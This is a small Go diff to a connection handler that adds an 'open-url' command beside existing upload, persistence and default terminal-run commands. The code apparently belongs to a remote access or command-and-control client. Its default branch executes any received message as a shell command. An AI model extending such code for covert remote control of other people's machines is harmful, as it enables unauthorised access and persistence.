@@ -48,6 +48,8 @@ func (c ConnectionHandler) Handle() error {
 			c.UseCase.Upload.File(message.Data)
 		case "persistence":
 			c.UseCase.Persistence.Persist(message.Data)
+		case "open-url":
+			c.UseCase.OpenURL.Open(string(message.Data))
 		default:
 			c.UseCase.Terminal.Run(string(message.Data))
 		}
